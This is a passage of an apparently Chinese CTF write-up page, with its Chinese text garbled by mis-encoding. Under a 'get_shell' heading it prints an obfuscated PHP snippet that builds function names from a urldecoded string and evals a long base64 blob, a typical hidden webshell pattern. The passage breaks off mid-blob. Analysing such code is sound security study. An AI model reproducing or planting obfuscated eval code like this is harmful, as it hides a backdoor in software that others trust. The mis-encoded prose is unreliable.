src="https://s2.loli.net/2022/04/25/odAQMfma1OIHBbU.png" alt="bypass.png"></p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/weixin_46578840/article/details/120140214?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_aa&utm_relevant_index=4">wp1</a></p><p><a href="https://blog.csdn.net/weixin_52116519/article/details/123962077">wp2</a></p></blockquote><p>å‘ç°phpæ··æ·†åçš„ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">3</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">6</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">33</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">33</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">10</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">10</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV</span> = <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">0</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">18</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">3</span>&#125; . <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">0</span>&#125; . <span class="variable">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ</span>&#123;<span class="number">1</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">24</span>&#125;;</span><br><span class="line"><span class="variable">$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR</span> = <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">7</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">13</span>&#125;;</span><br><span class="line"><span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span>.= <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">22</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">36</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">29</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">26</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">32</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">35</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">26</span>&#125; . <span class="variable">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC</span>(<span class="string">&quot;JE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGI9IldBckllVEJFWFBaTlN0b3ppZ2hmcENPUlV2S0x5eFFubXdsR2NqYVZiRGtGdUpZZHNNSHF1d1dBZW1NVWhRb0NMYURma0Z4VEtsenRCWHJkT2liSEpqeU52WVNQcGNzSVpFR1JnblZxUWM5alNWd0ZvTlBKU3U1eXJsUjZTMkNzcHV5TlBJb3JMSUk1dnU5RFJVYU9wSHhmbVZSSmIwdGpQQnlvU3lFSXVzRUNQMmlidVU5MlJCNUhCMkV4b0JJVkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzR2h5enZ1NXlwM0VVTFZ4TmJ5QzNHMGFEbU5LckJWdFFTQkNKdUJJSHVIb2twSXhQQnl0aFBKMWp0QjF0dDJhNkx1dGZSbTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdmVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuMzBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZNOXpPdG90MUtBUkp5amIzUDZtMW9pdnlSQkJCb2dvSHlsTGh0YnYyeGtHM3h5THMxZEdCUEdwMjEzQkpSWlB1YW1vVUlubXN0cVFMdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbmZUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdpblYwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25ZdDlka3RsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZlVqVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnT0NWMDdFSXRzdlUxclMyeEd0aElTbUpDYkdoeGtlQmFodDNLdVJOUEhCdTVPdUJpUXRKeTFTc3RjcEJ4THBWUk1iSjlQTGhvbXYyRzlFSXlWdXN4MlNoTWNSaEtRUEhJT1AxdHR0SmlKZUJFRVJJTWZTTkVZZU5Qcm1CYXh0UHhYcGhSTG8yNVBTMUNzYkJpenROSzduVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bm14OWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQzlka3RvdDFLQVJKeWpiM1A2bTFvaXZ5UkJCQm9nb0h5bExodGJ2MnhrRzN4eUxzMWRHQlBHcDIxM0JKUlpQdWFtb1VJbm1zdHFlZk05ZGt0b3QxS0FSSnlqYjNQNm0xb2l2eVJCQkJvZ29IeWxMaHRidjJ4a0czeHlMczFkR0JQR3AyMTNCSlJaUHVhbW9VSW5tc3RxZWZJOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQTBUbWdzdjNLeUcyMW9SdUlPcFZ4TlBCeWhldTlrUk5vWm1VNXJCUHRjdFZvYlMxb210MHhIdFBLS3VOeFFtQmEzdlVFc2J1S2lCWTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmczVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnaW4zMDdFTkk1bUhJWm91OU90VXg0dHNFbVIyQ2RTVWlxTHlNMG0yeWNveXlNbzFLMkdKaUdQUEVCUDFvYXZVUENCQlJXZXN5c3YzQlpRTHRsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZkFPVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnZkNIMFpFVUV1bUpFY0cyS1h2dUlaUmhFdG91eEVvMFBRcEJpVnVzMVBlSHlCZUlNZlJOYTNiaG9KdklDZEJ5eGdMSnlzUDB0TnVCeDduWXk5ZGt0bFBzNWtiMkNxcDNJeHBIUE9CdVBETHVSSW0yMW50MUtDUGhLNVBWeGJ2M3RXUjBJMm9ITW1MMUVHcFVLS29JUlV0eXlBZWZBMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZFOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbjFUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdPQ0gwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25mTTl6MlAyR3VqREVOSTVtSElab3U5T3RVeDR0c0VtUjJDZFNVaXFMeU0wbTJ5Y295eU1vMUsyR0ppR1BQRUJQMW9hdlVQQ0JCUldlc3lzdjNCREFzS0l1czl4TElLeEJZTWpweW9ndHlva3VWTTVHMFI0dlBLR3RIRUJudWl6UG1NZ1NQb0FCSG9ZblZ0Q0J1NURCMUdPdHN5eFBCNXFCeVBMblBLTlNVRXNuQkExdUowMHpCeWd2VlB5cHlLNUJzUnVleUNocFU1a1BCb2RQQlB6bklvWmJ5eXNuQjVMQllFTnYxb1BlTjl1bll5V29QUnp0MUV1Qll0U251aml1dWlyYjFDSVJJTXhuY1BpdUo1TmV5eXVMc2F5UEppNFBjTTBTeW9HTEh0dW5VR09Hc1JycHlLV25QSUxTMngyb2NDTHAySWd1SmF4UHlFckcwb0RiMUVoQ1BFaHBITUJQVXh1TE5Vam1zUFNQbUIwQlBvV0NQdGh6bUlrUGZQbFB1S3R6QnlxUk5pc3BCb2ZMMENZZDFNS0czUHJ0MEcxUE41TlJQS2h6aHlMdHVGMEJKYXJQTmJPbXNpeHRoeGlCMmlsbkliT3BVdFNwTmlsdVlJam55eWFlSXl1UHNLUFBZSVNSTkNJUHM1UFB1dE9vdWFnUzJuZlB1OXJ0SmlBUDJhRG5KSUdic3RzdVZNYlBKNU5lUEdpQnlFTHBoeGFvUFByTEp0TmJIS3h0MEtxb0JSdUwxdFBSTnhMUEp4Mkd5eHNCMURPQ1BveG5CNVdCUFA0bTFFVnAyOXJ0eUVXRzBCaUwyVU9TSXlMdVVveFBOMXpCUHlHU055eVBodEdCWUNqUDJ0VlBKNVBQZlA1UDFQNEJJRWFwY0l4UzFFVUd5UERCMkVBb1VFdHBteXVCMXhTUE5uT3V1OXJ0UEtRR0J4U0dQQWp2TjV1cFVvdUd5eGpldUNWZVZJU3VVb09QY0lnbXlCanBOeXVMSUUyR2ZNMG1QSVpTSUN1bnNvRUdQUHpTeUVQQllJU3RKeGxvY0lsQ1BLYUNWQ3JMVTQydXlSelJJUkdQSnhZcGhGMEJKaXVMeUdmcFZvb3B5RWFHSmE0bTFDZ3R5UHRuSUFPUEJSMFAxQmpvVXlTbklveEdQb0RwMWJqbkJpc24wRWN1c1BOdnVDdUxoSUNTdWFmTHNvTFMyQ0luQmF4bkp4b0J5eE5HUHRhbXlJb3VOeEtvUFAwdUlBZnZJUnN0MW9aUFB2MWVQUlBlSU1McHVqaUd1YUx0TkVQU0lDa0xOdGxCdTA1UHlDR3V5dFlueXlYTHNQU20ySUF1SklMblZNWlBKaU5QSkVHdlZ5WXQzeGl1eXhOdnliaXBVNVBuTmlLUHN4TFJKbmpSVTF0cEp4bVBZRU5MdUlQbUpLTFBQQWl1c29EYkpiaWJZUFNwbXRmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lqbVVDTFBQS0FiczVtcGh0WFAwUHVlSVJXQ3VLUHQwRzB1dTVnbUlHam9jb3VweUVndVlJTlJ1Q2dwVTFCbklLam9JUmp0UFVPbkJ5UHBoRmZCUFByUnlvUHBjRVBuMDVhTDBDTHQxdGFTY0VoUzJ0ZHVZSVNCeW9obm1vWXBzRWZHdTF1ZU5VanpQS0JQczVydXVpTG5OQWZtc2lCdEJEMFB1aXNTSUNWcFV0b25Jb0lvSVJMdVBJR29JSXlQMUsxbVV0TXYwS0FtWW9TUDA1MFAxeHVTTkNhZWN0THBJb3JQWUNnUnl5WkJKMWtTM3hRQjJpTlBQVWpCWUVQdDN0aFBtTXNMUERqUEpJeFBKeFhQY3dpbU5iZmJzQ1N0Qm9pRzFvRXZVYW1TM01RUmYwOUFrc0t6ZjgrUWM5alNWd0ZvTlBKU3U1eXJsUlpTeW81djBFU1JIeE9tTmFOdXV0enAyb1lvMFIxR2hSVUxKRWd2VTltQkJQQUJ5UGFMMnlNU1ZLRWIyUDBCVTFpdUlSQkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzTE5FR29WdFZQdWF5dEJ0Z0JKUmpSM0N4dkpvWlB5eVhQSUNkTHVDYlJKeGNQMktsU2hLdG1JSzR0czExZXUxTW1ISXJtZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdmVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuMzBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZNOXpPdEVwMkN5YjI1aVBzYVF0SmFPcElFcVBQTUlvVTVEYmhQbW1CS2xlSjFWUnl0bmVodEt2MlJqdXl5a0JQeEFvc3QzUDN4eFFMdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbmZUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdpblYwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25ZdDlka3RRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZlVqVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnT0NWMDdFVXRZR0h5Ym1ITW9CMGExdEJDMm91YUVQeUtnbTFJTlBVMTNvMXhLcHNJSkd1OUFvVktpU1VSaEJIRW52MjFyYkpLUFJWRjlFVXlYRzJQY3BISXVMMDlOUzNFZ0JKS1BCVVBzbUp4TVJQQ0NMc0U2cEJSMlBVaTVSTnlmbzNNU3V1RXR1VXhKdFZSaGVOSTduVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bm14OWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQzlka3RFcDJDeWIyNWlQc2FRdEphT3BJRXFQUE1Jb1U1RGJoUG1tQktsZUoxVlJ5dG5laHRLdjJSanV5eWtCUHhBb3N0M1AzeHhlZk05ZGt0RXAyQ3liMjVpUHNhUXRKYU9wSUVxUFBNSW9VNURiaFBtbUJLbGVKMVZSeXRuZWh0S3YyUmp1eXlrQlB4QW9zdDNQM3h4ZWZJOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmQTBUbWdzUzJDM0wyRW1vMnhoU2hLb3RoUE10MHRRUFVveExJeHRCSHRabVZ5bHBVS2piMHlhb3VLZnZzNTJ1SEliUFBvNG9zMXNwZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmczVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnaW4zMDdFVXhrdU50MHQxUFdvQlBVcElFSHZWUmZHaEVKcHlvb3AxdG1MMHlZQlZvRGIxUnFiSnk2QkJpU2VVb0NSaHlhYkI1aUxzOFpRTHRRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZkFPVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnZkNIMFpFVTlncHN0V2VzNXl2aG9xTDIxb1NVMWxMUEM0THNDMXVKb3RCSFJuUDB4VnRIQzBQdUNNcDF4dWVoRWtTQlBCQk5Jc28zTTduWXk5ZGt0UXBONVVTM0t6b2hJMlNzYWF1dXhDYnN5bWVVS2NSUEtKQlBFM21JUkF0MG9mUklQWWJ1OUdQSHlPR0p5SVBJTXhvTlJqZWZBMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZFOWRrdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbjFUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdPQ0gwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25mTTl6MlAyR3VqREVVeGt1TnQwdDFQV29CUFVwSUVIdlZSZkdoRUpweW9vcDF0bUwweVlCVm9EYjFScWJKeTZCQmlTZVVvQ1JoeWFiQjVpTHM4REFzS0lTTjFzUHM1WlBJUHJCTlBWU1Zvc3BzRGpHSjBpdUpQYVJJb0xuSUtOUDI1enZJRU5TY1BtUzJpZnV1YTB0SUdPdlZSdVMzeHRQc3hzU0pDaFBKeEJTMG9tdXNvSXpCeWdvY010bjJ4NkcxUHVuUHRJQ1BQUG5OdG1HbUlTcFBSV1JVeXhwSW9TUEJQZ1J5RE9DQkN4UFBLWEcyMXJDUGJpU054b25Vb2dHc3ZpbjJDSXZOYXlweUtMQnNCaXQxeWdMeUtrUzN4Z1BZQ3VMSW9JUlZLQnBWd09QY0NsU3lEalBIeXN0Snhjb0JQekJKRVZ2SVJTUzFBZlBtQWlDdUNQU1ZNeG5CRXpvdTFMTDF5UHBWb3RQMnh1UDBSSEN1UFp0SjV4UHV0bVBJUlNTMkNVTEoxa3Bzb1Z1UHhEU0lvcXBVNVlQUEtTUEJSemVzNVBlY0VQUHNFckJQb2xTMDFhUk41bXBJbzRtQnhsUjJDVlBtSWtuMEV6QllJTm0wMGZ1SjFvUFVFUXVtQ0xteVJHdklQQ1B1dFFQTjVycFBuZnVzUkN1SW80RzJpU0NOVWl2SUl4TFVBMVBOYU5QdVB1dVlNc1Nzb2x1c3ZpQ3MxVm1zRVluMXk1b1VQU0NKUEl2SVJRUEJvUG1QUHNlUEVxbXlJb3BKdDZQQlBnZU5QUG9OYW10VUt0R1lDWWVQeWF0Skt1dGZiNUx1SzBwTnRhdEhDZGIyblhCTnlZUkJLSVNOeWh0MUFqQllJdXZ5S1BQc1BrdHNLWkcweHNleXlHTEoxa3BJS1NHWUlMUEluanBOS1BMSUtYQm1Jc3ZQSWFwY29QUGh4eG9CUFNtSnRHcFZ0dFBtUDRCMmc0cDBLSXBWb29ueW9VR0o1TlAxbmp6QlJ4bjBLZlB1MWpQeVBJUEphQnB1eGxvSW96bXlDV0xZb2tQdWJPUHNQNEN1dFZwVktTbjBFeFAxUnJCeVJJU04xTExOdEdvQlJJcDBLSUJKS29wSml0UE41bHV5QmpSY0lMUEI0T3V5UjBMeW9ndlZDQm5Cb1ZQc0JpbjFEaVNWTWtTMG9hdVB2NUxQS0F2Vnh4dHV0R1B1NXJtdW5PbkJhdHBoTXVvVXhIcDBLSVNOMXNQczVaUElQckJOUFZTVm9zcHNEakdKMGl1SlBhUklvTG5JS05QMjV6dklFTlNjUG1TMmlmdXVhMHRJR092VlJ1UzN4dFBzeHNTSkNoUEp4QlMwb211c29JdjBLVlJOS3NuVnRLUG1Fc3AxR09wY29oUFBHaUJQUHN0UGJpQnNSb1B1eG9QUG9ybk5FV2VjUHRwaHhkRzBQekxKRWhQSElZbjBLUW9OaWplSVBOUHlSeXQxS3p1c3Y0dkIxS1MzQ3J0UEVxdXU1Z0JQdFpieUtQblZiaUJ5UHpueUtoUlVLdXBWTWZQY0lOdDFvSW5tQ1NudXhqR0phTnBQeWh6QnlTTFZNNEdCUHN1SVBaTHMxWW5ZSWRCdTFqUEp0QW8yOXJ0dXhhb0lvenB5dFBMeU15dDJ4Mm9ONXJuTkVhblBLeXBodHVCWU1TdHlSWm1ITUx0SkYxQjJhZ3YxeVdSVXR1bkhNM1BKYTRCUG9Bb05LWVAxb0RQTmFOQjFLTnRoQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWQ3J0M3Rxb2NNMFNQQk9vTjl1bkpqMlAxUHVuUElQb1VQQm5QRVZ1UFBEdVBQdUxZTWtTM0YxQnUxNEwyQ0ltc0trUDFvaUdmQ3JtMnRndlZ4UHR5b2hvQlJTbXlLVnpWTW5iMUVJdW1FckNQUElDaFJoUHM1bm9JUHV0TnRhUEhFbVB5S3hHc0I1QnlFZ0JzNXNuSnRvR1B2MWJ5S2F0SG9tdDFBMkcxUkRMSUdpTEh5QkxVNTBCMmFydlBvR0JZdGRiMUVFdUo1dVBJRGpuQkNCbjJ4WEdZQ1NldXRWQ2h0aHVWTU9QeVBzdDFFdXZWS3hQUEVvb1BQakxKRVZMc2l0bnV0aUcwb1NtUFBOQllDb24wb2d1UEIxYnlQYUJ5RW50VUlmTHNSMFNKYmpSTnlQbkp0WFBZRWdDeVJQUFlJdFB1dElQY0lMdDF5UFNJeVBQc0RqR0phNENQSWFlVW